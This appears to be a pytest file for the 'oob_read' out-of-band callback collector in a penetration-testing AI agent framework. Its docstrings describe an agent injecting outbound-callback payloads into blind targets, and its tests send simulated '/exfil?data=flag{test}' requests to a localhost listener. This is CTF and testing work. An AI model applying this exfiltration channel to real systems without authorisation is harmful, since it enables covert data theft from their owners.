"""`oob_read` 盲打带外回传原语回归（REPORT §8.7-1 完整版）。

场景：零回显靶上 agent 注入"出网回连"载荷，内核收集器记回调，
`oob_read` 一发收结果——外带假设从 N 种收窄到 1 种。
"""
import json
import socket
import sys
import urllib.request
from pathlib import Path

PROJECT_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(PROJECT_ROOT))

import pytest

from penagent import oob
from penagent.builtin_tools import oob_read


def _free_port() -> int:
    with socket.socket() as s:
        s.bind(("127.0.0.1", 0))
        return s.getsockname()[1]


def _callback(url: str) -> None:
    req = urllib.request.Request(url, headers={"User-Agent": "oob-test/1.0"})
    urllib.request.urlopen(req, timeout=3).read()


def teardown_function():
    oob.shutdown_all()


def test_collector_captures_callback():
    port = oob.start(_free_port())
    _callback(f"http://127.0.0.1:{port}/exfil?data=flag%7Btest%7D")
    hits = oob.read_hits(port)
    assert len(hits) == 1
    hit = hits[0]
    assert hit["path"] == "/exfil"
    assert hit["query"]["data"] == "flag{test}"
    assert hit["client"] == "127.0.0.1"
    assert hit["method"] == "GET"
    assert hit["user_agent"] == "oob-test/1.0"


def test_start_is_idempotent_and_shifts_when_busy():
    """同端口重复 start 复用；被其它进程占用时自动上移。"""
    port = oob.start(_free_port())
    assert oob.start(port) == port                      # 幂等复用
    # 占住下一个端口，模拟冲突 → 实际端口应跳过它
    blocker = socket.socket()
    blocker.bind(("127.0.0.1", port + 1))
    blocker.listen(1)
    port2 = oob.start(port + 1)
    assert port2 == port + 2
    blocker.close()


def test_oob_read_roundtrip():
    """工具层：首次调用起收集器，回连后再调一次收回带结果。"""
    port = _free_port()
    first = oob_read(port=port, wait=0)
    assert first["ok"] is True
    assert first["count"] == 0
    assert str(port) in first["callback"]               # callback 含实际端口
    _callback(f"http://127.0.0.1:{first['port']}/n?data=leak")
    second = oob_read(port=port, wait=0)
    assert second["count"] == 1
    assert second["hits"][0]["query"]["data"] == "leak"


def test_oob_read_clear_empties_hits():
    port = _free_port()
    oob_read(port=port, wait=0)
    _callback(f"http://127.0.0.1:{oob.start(port)}/a")
    cleared = oob_read(port=port, wait=0, clear=True)
    assert cleared["count"] == 1
    again = oob_read(port=port, wait=0)
    assert again["count"] == 0                          # 已清零


def test_oob_read_rejects_bad_port():
    r = oob_read(port=80)                               # 特权口
    assert r["ok"] is False
    assert "启动失败" in r["error"]
    r = oob_read(port=99999)
    assert r["ok"] is False


def test_oob_read_wait_is_capped(monkeypatch):
    """wait 上限 10s：传 999 不许真睡（防 agent 一次调用拖死预算）。"""
    slept = []
    monkeypatch.setattr("time.sleep", lambda s: slept.append(s))
    oob_read(port=_free_port(), wait=999)
    assert slept and slept[0] <= 10


def test_oob_hits_capped_at_100():
    """留痕上限：超过 100 条丢最旧，内存不随载荷刷量增长。"""
    port = oob.start(_free_port())
    for i in range(105):
        with oob._lock:
            oob._hits[port].append({"i": i})
    hits = oob.read_hits(port)
    assert len(hits) == oob.MAX_HITS
    assert hits[-1] == {"i": 104}


def test_oob_read_visible_in_ctf_web_mode():
    """ctf-web 模式白名单含 oob_read（allow + auto_approve 都要可解析）。"""
    from penagent.modes import load_mode

    mode = load_mode("ctf-web")
    assert mode.capability.allows("oob_read")
